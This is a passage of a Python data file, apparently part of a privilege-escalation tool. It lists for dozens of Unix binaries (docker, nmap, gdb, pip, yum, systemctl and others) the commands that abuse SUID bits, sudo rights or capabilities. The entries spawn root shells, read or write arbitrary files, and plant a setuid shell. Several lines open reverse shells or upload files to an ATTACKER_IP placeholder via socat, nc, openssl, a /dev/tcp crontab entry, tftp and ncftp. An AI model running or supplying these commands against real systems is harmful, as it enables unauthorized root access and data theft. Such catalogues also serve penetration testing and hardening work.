        "shell": (1, "sudo strace -o /dev/null /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["ltrace"] = {
    "suid": {
        "shell": (1, "ltrace -b -L /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo ltrace -b -L /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["taskset"] = {
    "suid": {
        "shell": (1, "taskset 1 /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo taskset 1 /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["nohup"] = {
    "suid": {
        "shell": (1, "nohup /bin/sh -p -c 'sh -p <$(tty) >$(tty) 2>$(tty)'"),
    },
    "sudo": {
        "shell": (1, "sudo nohup /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["stdbuf"] = {
    "suid": {
        "shell": (1, "stdbuf -i0 /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo stdbuf -i0 /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["flock"] = {
    "suid": {
        "shell": (1, "flock -u / /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo flock -u / /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["setarch"] = {
    "suid": {
        "shell": (1, "setarch $(arch) /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo setarch $(arch) /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["unshare"] = {
    "suid": {
        "shell": (1, "unshare /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo unshare /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["run-parts"] = {
    "suid": {
        "shell": (1, "run-parts --new-session --regex '^sh$' /bin --arg='-p'"),
    },
    "sudo": {
        "shell": (1, "sudo run-parts --new-session --regex '^sh$' /bin"),
    },
    "capabilities": {},
}

COMMANDS["start-stop-daemon"] = {
    "suid": {
        "shell": (1, "start-stop-daemon --start -n foo -S -x /bin/sh -- -p"),
    },
    "sudo": {
        "shell": (1, "sudo start-stop-daemon --start -n foo -S -x /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["expect"] = {
    "suid": {
        "shell": (1, "expect -c 'spawn /bin/sh -p; interact'"),
    },
    "sudo": {
        "shell": (1, "sudo expect -c 'spawn /bin/sh; interact'"),
    },
    "capabilities": {},
}

COMMANDS["busybox"] = {
    "suid": {
        "shell": (1, "busybox sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo busybox sh"),
    },
    "capabilities": {},
}

COMMANDS["docker"] = {
    "suid": {
        "shell": (1, "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
    },
    "sudo": {
        "shell": (1, "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
    },
    "capabilities": {},
}

COMMANDS["socat"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo socat stdin exec:/bin/sh"),
        "reverse_shell": (2, "sudo socat tcp-connect:ATTACKER_IP:PORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"),
    },
    "capabilities": {},
}

COMMANDS["ssh"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"),
    },
    "capabilities": {},
}

COMMANDS["scp"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:"),
    },
    "capabilities": {},
}

COMMANDS["git"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo git -p help config\n!/bin/sh"),
        "file_read": (3, "sudo git diff /dev/null /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["man"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo man man\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["ftp"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo ftp\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["mysql"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo mysql -e '\\! /bin/sh'"),
        "file_read": (3, "sudo mysql -e 'SELECT LOAD_FILE(\"/path/to/file\")'"),
    },
    "capabilities": {},
}

COMMANDS["apache2"] = {
    "suid": {},
    "sudo": {
        "file_read": (3, "sudo apache2 -f /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["service"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo service ../../bin/sh ."),
    },
    "capabilities": {},
}


# ============================================================================
# NETWORK & SYSTEM UTILITIES
# ============================================================================

COMMANDS["nmap"] = {
    "suid": {
        "shell": (1, "nmap --interactive\n!/bin/sh -p\n# NOTE: --interactive only works on nmap 2.02-5.21"),
        "file_read": (3, "nmap -iL /path/to/file"),
        "file_write": (4, "nmap -oG=/path/to/file DATA"),
    },
    "sudo": {
        "shell": (1, "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; sudo nmap --script=$TF"),
        "file_read": (3, "sudo nmap -iL /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["nc"] = {
    "suid": {},
    "sudo": {
        "reverse_shell": (2, "sudo nc ATTACKER_IP PORT -e /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["openssl"] = {
    "suid": {
        "file_read": (3, "openssl enc -in /path/to/file"),
        "reverse_shell": (2, "# On attacker: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port PORT\n# On target:\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:PORT > /tmp/s; rm /tmp/s"),
    },
    "sudo": {
        "file_read": (3, "sudo openssl enc -in /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["soelim"] = {
    "suid": {
        "file_read": (3, "soelim /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo soelim /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["ip"] = {
    "suid": {
        "file_read": (3, "ip -force -batch /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo ip -force -batch /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["ss"] = {
    "suid": {
        "file_read": (3, "ss -a -F /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo ss -a -F /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["base64"] = {
    "suid": {
        "file_read": (3, "base64 /path/to/file | base64 -d"),
    },
    "sudo": {
        "file_read": (3, "sudo base64 /path/to/file | base64 -d"),
    },
    "capabilities": {},
}

COMMANDS["base32"] = {
    "suid": {
        "file_read": (3, "base32 /path/to/file | base32 -d"),
    },
    "sudo": {
        "file_read": (3, "sudo base32 /path/to/file | base32 -d"),
    },
    "capabilities": {},
}

COMMANDS["xxd"] = {
    "suid": {
        "file_read": (3, "xxd /path/to/file | xxd -r"),
        "file_write": (4, "echo DATA | xxd | xxd -r > /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo xxd /path/to/file | xxd -r"),
    },
    "capabilities": {},
}

COMMANDS["od"] = {
    "suid": {
        "file_read": (3, "od -An -c -w9999 /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo od -An -c -w9999 /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["hd"] = {
    "suid": {
        "file_read": (3, "hd /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo hd /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["hexdump"] = {
    "suid": {
        "file_read": (3, "hexdump -C /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo hexdump -C /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["strings"] = {
    "suid": {
        "file_read": (3, "strings /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo strings /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["file"] = {
    "suid": {
        "file_read": (3, "file -f /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo file -f /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["rev"] = {
    "suid": {
        "file_read": (3, "rev /path/to/file | rev"),
    },
    "sudo": {
        "file_read": (3, "sudo rev /path/to/file | rev"),
    },
    "capabilities": {},
}

COMMANDS["nl"] = {
    "suid": {
        "file_read": (3, "nl -bn -w1 -s '' /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo nl -bn -w1 -s '' /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["wc"] = {
    "suid": {
        "file_read": (3, "wc --files0-from /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo wc --files0-from /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["column"] = {
    "suid": {
        "file_read": (3, "column /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo column /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["comm"] = {
    "suid": {
        "file_read": (3, "comm /path/to/file /dev/null 2>/dev/null"),
    },
    "sudo": {
        "file_read": (3, "sudo comm /path/to/file /dev/null 2>/dev/null"),
    },
    "capabilities": {},
}

COMMANDS["join"] = {
    "suid": {
        "file_read": (3, "join -a 2 /dev/null /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo join -a 2 /dev/null /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["paste"] = {
    "suid": {
        "file_read": (3, "paste /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo paste /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["expand"] = {
    "suid": {
        "file_read": (3, "expand /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo expand /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["unexpand"] = {
    "suid": {
        "file_read": (3, "unexpand /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo unexpand /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["fold"] = {
    "suid": {
        "file_read": (3, "fold /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo fold /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["fmt"] = {
    "suid": {
        "file_read": (3, "fmt /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo fmt /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["pr"] = {
    "suid": {
        "file_read": (3, "pr -T /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo pr -T /path/to/file"),
    },
    "capabilities": {},
}

# ============================================================================
# SYSTEM / SERVICE MANAGEMENT
# ============================================================================

COMMANDS["systemctl"] = {
    "suid": {
        "shell": (1, "systemctl\n!/bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo systemctl\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["journalctl"] = {
    "suid": {
        "shell": (1, "journalctl\n!/bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo journalctl\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["dmsetup"] = {
    "suid": {
        "shell": (1, "dmsetup create base <<EOF\n0 3534848 linear /dev/sda 94208\nEOF\ndmsetup ls --exec '/bin/sh -p -s'"),
    },
    "sudo": {
        "shell": (1, "sudo dmsetup ls --exec '/bin/sh -s'"),
    },
    "capabilities": {},
}

COMMANDS["at"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "echo '/bin/sh <$(tty) >$(tty) 2>$(tty)' | sudo at now; tail -f /dev/null"),
    },
    "capabilities": {},
}

COMMANDS["crontab"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo crontab -e\n# In editor: * * * * * /bin/sh -c 'sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"),
    },
    "capabilities": {},
}

COMMANDS["capsh"] = {
    "suid": {
        "shell": (1, "capsh --gid=0 --uid=0 --"),
    },
    "sudo": {
        "shell": (1, "sudo capsh --"),
    },
    "capabilities": {
        "shell": (1, "capsh --gid=0 --uid=0 --"),
    },
}

COMMANDS["dmesg"] = {
    "suid": {
        "shell": (1, "dmesg -H\n!/bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo dmesg -H\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["mount"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo mount -o bind /bin/sh /bin/mount; sudo mount"),
    },
    "capabilities": {},
}

COMMANDS["restic"] = {
    "suid": {
        "file_read": (3, "RESTIC_REPOSITORY=/tmp/backup RESTIC_PASSWORD=anything restic backup /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo RESTIC_REPOSITORY=/tmp/backup RESTIC_PASSWORD=anything restic backup /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["rsync"] = {
    "suid": {
        "shell": (1, "rsync -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null"),
        "file_read": (3, "rsync /path/to/file /dev/stdout"),
    },
    "sudo": {
        "shell": (1, "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"),
    },
    "capabilities": {},
}

COMMANDS["watch"] = {
    "suid": {
        "shell": (1, "watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"),
        "file_read": (3, "watch -x cat /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"),
    },
    "capabilities": {},
}

COMMANDS["make"] = {
    "suid": {
        "shell": (1, "COMMAND='/bin/sh -p' make -s --eval=$'x:\\n\\t-$(COMMAND)'"),
    },
    "sudo": {
        "shell": (1, "COMMAND='/bin/sh' sudo make -s --eval=$'x:\\n\\t-$(COMMAND)'"),
    },
    "capabilities": {},
}

COMMANDS["rlwrap"] = {
    "suid": {
        "shell": (1, "rlwrap -H /dev/null /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo rlwrap /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["gdb"] = {
    "suid": {
        "shell": (1, "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"),
    },
    "sudo": {
        "shell": (1, "sudo gdb -nx -ex '!sh' -ex quit"),
    },
    "capabilities": {
        "shell": (1, "gdb -nx -ex 'python import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")' -ex quit"),
    },
}

COMMANDS["logsave"] = {
    "suid": {
        "shell": (1, "logsave /dev/null /bin/sh -p -i"),
    },
    "sudo": {
        "shell": (1, "sudo logsave /dev/null /bin/sh -i"),
    },
    "capabilities": {},
}

COMMANDS["look"] = {
    "suid": {
        "file_read": (3, "look '' /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo look '' /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["install"] = {
    "suid": {
        "file_read": (3, "install -m 0777 /path/to/file /tmp/output"),
    },
    "sudo": {
        "file_write": (4, "sudo install -m 04755 /bin/sh /tmp/rootsh"),
    },
    "capabilities": {},
}

COMMANDS["date"] = {
    "suid": {
        "file_read": (3, "date -f /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo date -f /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["cmp"] = {
    "suid": {
        "file_read": (3, "cmp /path/to/file /dev/zero -b -l"),
    },
    "sudo": {
        "file_read": (3, "sudo cmp /path/to/file /dev/zero -b -l"),
    },
    "capabilities": {},
}

COMMANDS["ld.so"] = {
    "suid": {
        "shell": (1, "/lib/ld.so /bin/sh -p"),
    },
    "sudo": {},
    "capabilities": {},
}

COMMANDS["update-alternatives"] = {
    "suid": {
        "file_read": (3, "update-alternatives --force --install /path/to/link x /path/to/file 1 --slave /dev/stdout y /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo update-alternatives --force --install /path/to/link x /path/to/file 1"),
    },
    "capabilities": {},
}

COMMANDS["cpulimit"] = {
    "suid": {
        "shell": (1, "cpulimit -l 100 -f /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo cpulimit -l 100 -f /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["cpio"] = {
    "suid": {
        "file_read": (3, "echo '/path/to/file' | cpio -o --format=newc | cpio -i --to-stdout"),
    },
    "sudo": {
        "file_read": (3, "echo '/path/to/file' | sudo cpio -o --format=newc | cpio -i --to-stdout"),
    },
    "capabilities": {},
}

COMMANDS["ar"] = {
    "suid": {
        "file_read": (3, "TF=$(mktemp -u); ar r $TF /path/to/file; cat $TF"),
    },
    "sudo": {
        "file_read": (3, "TF=$(mktemp -u); sudo ar r $TF /path/to/file; cat $TF"),
    },
    "capabilities": {},
}

COMMANDS["sqlite3"] = {
    "suid": {
        "shell": (1, "sqlite3 /dev/null '.shell /bin/sh -p'"),
        "file_read": (3, "sqlite3 /dev/null \".read /path/to/file\""),
    },
    "sudo": {
        "shell": (1, "sudo sqlite3 /dev/null '.shell /bin/sh'"),
    },
    "capabilities": {},
}

COMMANDS["pip"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\",\"sh\")' > $TF/setup.py; sudo pip install $TF"),
    },
    "capabilities": {},
}

COMMANDS["apt"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo apt changelog apt\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["apt-get"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo apt-get changelog apt\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["dpkg"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo dpkg -l\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["rpm"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"),
    },
    "capabilities": {},
}

COMMANDS["yum"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "TF=$(mktemp -d); cat >$TF/x.conf<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\ncat >$TF/y.py<<EOF\nimport os\nfrom yum.plugins import PluginYumExit\ndef init_hook(conduit):\n  os.execl('/bin/sh','sh')\nEOF\nsudo yum -c $TF/x.conf --enableplugin=y"),
    },
    "capabilities": {},
}

COMMANDS["snap"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "# Create malicious snap:\n# fpm -n evil -s dir -t snap -a all --snap-confinement devmode --after-install /tmp/x.sh .\n# Contents of x.sh: #!/bin/bash\\n/bin/bash\nsudo snap install evil_1.0_all.snap --dangerous --devmode"),
    },
    "capabilities": {},
}

COMMANDS["iftop"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo iftop\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["screen"] = {
    "suid": {
        "shell": (1, "screen"),
    },
    "sudo": {
        "shell": (1, "sudo screen"),
    },
    "capabilities": {},
}

COMMANDS["tmux"] = {
    "suid": {
        "shell": (1, "tmux"),
    },
    "sudo": {
        "shell": (1, "sudo tmux"),
    },
    "capabilities": {},
}

COMMANDS["script"] = {
    "suid": {
        "shell": (1, "script -q /dev/null -c '/bin/sh -p'"),
    },
    "sudo": {
        "shell": (1, "sudo script -q /dev/null -c /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["pager"] = COMMANDS["less"].copy()

COMMANDS["alpine"] = {
    "suid": {
        "shell": (1, "alpine -F /path/to/file\n# From within: ! /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo alpine\n# From within: ! /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["w3m"] = {
    "suid": {
        "shell": (1, "w3m http://localhost\n# Then: ! /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo w3m http://localhost\n# Then: ! /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["links"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "sudo links\n# Then: Menu -> OS Shell"),
    },
    "capabilities": {},
}

COMMANDS["tac"] = {
    "suid": {
        "file_read": (3, "tac /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo tac /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["shuf"] = {
    "suid": {
        "file_read": (3, "shuf /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo shuf /path/to/file"),
    },
    "capabilities": {},
}

# ============================================================================
# BATCH 3: MISSING BINARIES N-Z
# ============================================================================

COMMANDS["nasm"] = {
    "suid": {
        "file_read": (3, "nasm -@ /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo nasm -@ /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["ncftp"] = {
    "suid": {
        "file_upload": (3, "ncftp -u user -p pass ATTACKER_IP\nput /path/to/file"),
    },
    "sudo": {
        "file_upload": (3, "sudo ncftp -u user -p pass ATTACKER_IP\nput /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["nft"] = {
    "suid": {
        "file_read": (3, "nft -f /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo nft -f /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["nm"] = {
    "suid": {
        "file_read": (3, "nm @/path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo nm @/path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["ntpdate"] = {
    "suid": {
        "file_read": (3, "ntpdate -s /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo ntpdate -s /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["openvpn"] = {
    "suid": {
        "shell": (1, "openvpn --dev null --script-security 2 --up '/bin/sh -p -s'"),
        "file_read": (3, "openvpn --config /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo openvpn --dev null --script-security 2 --up '/bin/sh -s'"),
        "file_read": (3, "sudo openvpn --config /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["pandoc"] = {
    "suid": {
        "file_read": (3, "pandoc /path/to/file"),
        "file_write": (4, "echo DATA | pandoc -o /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo pandoc /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["perf"] = {
    "suid": {
        "shell": (1, "perf stat /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo perf stat /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["pexec"] = {
    "suid": {
        "shell": (1, "pexec /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo pexec /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["pg"] = {
    "suid": {
        "shell": (1, "pg /etc/hosts\n!/bin/sh"),
        "file_read": (3, "pg /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo pg /etc/hosts\n!/bin/sh"),
        "file_read": (3, "sudo pg /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["pidstat"] = {
    "suid": {
        "file_read": (3, "pidstat -e cat /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo pidstat -e cat /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["ptx"] = {
    "suid": {
        "file_read": (3, "ptx /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo ptx /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["readelf"] = {
    "suid": {
        "file_read": (3, "readelf -a @/path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo readelf -a @/path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["rtorrent"] = {
    "suid": {
        "shell": (1, "echo 'execute = /bin/sh,-p,-c,\"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty\"' >~/.rtorrent.rc\nrtorrent"),
    },
    "sudo": {
        "shell": (1, "echo 'execute = /bin/sh,-c,\"/bin/sh </dev/tty >/dev/tty 2>/dev/tty\"' >~/.rtorrent.rc\nsudo rtorrent"),
    },
    "capabilities": {},
}

COMMANDS["sash"] = {
    "suid": {
        "shell": (1, "sash"),
    },
    "sudo": {
        "shell": (1, "sudo sash"),
    },
    "capabilities": {},
}

COMMANDS["scanmem"] = {
    "suid": {
        "shell": (1, "scanmem\nshell /bin/sh"),
    },
    "sudo": {
        "shell": (1, "sudo scanmem\nshell /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["setfacl"] = {
    "suid": {
        "file_write": (4, "setfacl -m u:$(id -un):rwx /path/to/file"),
    },
    "sudo": {
        "file_write": (4, "sudo setfacl -m u:$(id -un):rwx /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["setlock"] = {
    "suid": {
        "shell": (1, "setlock - /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo setlock - /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["softlimit"] = {
    "suid": {
        "shell": (1, "softlimit /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo softlimit /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["sshpass"] = {
    "suid": {
        "shell": (1, "sshpass /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo sshpass /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["sysctl"] = {
    "suid": {
        "file_read": (3, "sysctl -n /../../path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo sysctl -n /../../path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["tbl"] = {
    "suid": {
        "file_read": (3, "tbl /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo tbl /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["terraform"] = {
    "suid": {
        "file_read": (3, "terraform console\nfile(\"/path/to/file\")"),
    },
    "sudo": {
        "file_read": (3, "sudo terraform console\nfile(\"/path/to/file\")"),
    },
    "capabilities": {},
}

COMMANDS["tftp"] = {
    "suid": {
        "file_upload": (3, "tftp ATTACKER_IP\nput /path/to/file"),
    },
    "sudo": {
        "file_upload": (3, "sudo tftp ATTACKER_IP\nput /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["tic"] = {
    "suid": {
        "file_read": (3, "tic -C /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo tic -C /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["troff"] = {
    "suid": {
        "file_read": (3, "troff /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo troff /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["ul"] = {
    "suid": {
        "file_read": (3, "ul /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo ul /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["unsquashfs"] = {
    "suid": {
        "file_read": (3, "unsquashfs -d /tmp/out /path/to/squashfs-file"),
    },
    "sudo": {
        "file_read": (3, "sudo unsquashfs -d /tmp/out /path/to/squashfs-file"),
    },
    "capabilities": {},
}

COMMANDS["unzip"] = {
    "suid": {
        "file_read": (3, "unzip -p /path/to/file.zip"),
    },
    "sudo": {
        "file_read": (3, "sudo unzip -p /path/to/file.zip"),
    },
    "capabilities": {},
}

COMMANDS["uudecode"] = {
    "suid": {
        "file_read": (3, "uuencode /path/to/file /dev/stdout | uudecode"),
    },
    "sudo": {
        "file_read": (3, "sudo uuencode /path/to/file /dev/stdout | uudecode"),
    },
    "capabilities": {},
}

COMMANDS["uuencode"] = {
    "suid": {
        "file_read": (3, "uuencode /path/to/file /dev/stdout"),
    },
    "sudo": {
        "file_read": (3, "sudo uuencode /path/to/file /dev/stdout"),
    },
    "capabilities": {},
}

COMMANDS["vagrant"] = {
    "suid": {
        "shell": (1, "echo 'system(\"/bin/sh -p\")' > Vagrantfile; vagrant up"),
    },
    "sudo": {
        "shell": (1, "echo 'system(\"/bin/sh\")' > Vagrantfile; sudo vagrant up"),
    },
    "capabilities": {},
}

COMMANDS["varnishncsa"] = {
    "suid": {
        "file_read": (3, "varnishncsa -g request -q 'ReqURL ~ \"/\"' -F '%{VCL_Log:foo}x' -w /dev/stdout -r /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo varnishncsa -g request -q 'ReqURL ~ \"/\"' -F '%{VCL_Log:foo}x' -w /dev/stdout -r /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["vigr"] = {
    "suid": {
        "file_write": (4, "vigr"),
    },
    "sudo": {
        "file_write": (4, "sudo vigr"),
    },
    "capabilities": {},
}

COMMANDS["vipw"] = {
    "suid": {
        "file_write": (4, "vipw"),
    },
    "sudo": {
        "file_write": (4, "sudo vipw"),
    },
    "capabilities": {},
}

COMMANDS["whiptail"] = {
    "suid": {
        "file_read": (3, "whiptail --textbox /path/to/file 20 80"),
    },
    "sudo": {
        "file_read": (3, "sudo whiptail --textbox /path/to/file 20 80"),
    },
    "capabilities": {},
}

COMMANDS["xdotool"] = {
    "suid": {
        "shell": (1, "xdotool exec --sync /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo xdotool exec --sync /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["xmodmap"] = {
    "suid": {
        "file_read": (3, "xmodmap /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo xmodmap /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["xmore"] = {
    "suid": {
        "file_read": (3, "xmore /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo xmore /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["xz"] = {
    "suid": {
        "file_read": (3, "xz -d < /path/to/file.xz"),
    },
    "sudo": {
        "file_read": (3, "sudo xz -d < /path/to/file.xz"),
    },
    "capabilities": {},
}

COMMANDS["zsoelim"] = {
    "suid": {
        "file_read": (3, "zsoelim /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo zsoelim /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["arp"] = {
    "suid": {
        "file_read": (3, "arp -v -f /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo arp -v -f /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["as"] = {
    "suid": {
        "file_read": (3, "as @/path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo as @/path/to/file"),
    },
    "capabilities": {},
